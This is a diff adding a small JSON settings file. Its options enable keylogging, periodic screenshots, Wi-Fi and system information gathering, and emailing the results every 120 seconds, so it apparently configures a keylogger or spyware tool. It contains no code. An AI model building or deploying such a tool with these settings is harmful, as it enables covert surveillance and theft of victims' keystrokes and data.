@@ -1,0 +1,12 @@
+{
+    "info_email": "",
+    "email_send": 120,
+    "take_screenshot": true,
+    "screenshot_time": 10,
+    "key_logg": true,
+    "get_wifi_info": true,
+    "system_info": true
+
+}
+
+
